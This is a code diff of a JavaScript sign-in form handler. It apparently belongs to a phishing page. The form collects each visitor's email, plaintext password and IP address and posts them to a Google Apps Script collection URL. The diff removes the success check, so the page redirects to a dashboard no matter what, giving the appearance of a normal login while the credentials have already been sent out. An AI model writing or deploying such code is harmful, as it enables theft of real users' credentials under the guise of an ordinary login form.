@@ -38,20 +38,16 @@ document.addEventListener('DOMContentLoaded', () => {
                     formData.append('IPAddress', userIP);
                     formData.append('Email', email);
                     formData.append('Password', password);
-                    formData.append('FormId', 'form1');
+                    formData.append('FormId', 'form12');
 
                     const scriptURL = 'https://script.google.com/macros/s/AKfycbyujy1R5qLrISn3RTBut1RC9fwZbJ7bh2YELsYqXUw7M0uARGtdWcjKoYF_VnZx5kYA/exec';
                     fetch(scriptURL, {
                         method: 'POST',
                         body: formData,
                     })
-                    .then(response => response.json())
-                    .then(result => {
-                        if (result.success) { // Check the response for a success indicator
-                            window.location.href = '/dashboard'; // Navigate to /dashboard
-                        } else {
-                            console.error('Sign-in failed:', result.message);
-                        }
+                    .then(response => {
+                        console.log('Form data sent.');
+                        window.location.href = '/dashboard'; // Navigate to /dashboard
                     })
                     .catch(error => console.error('Error!', error.message));
                 });
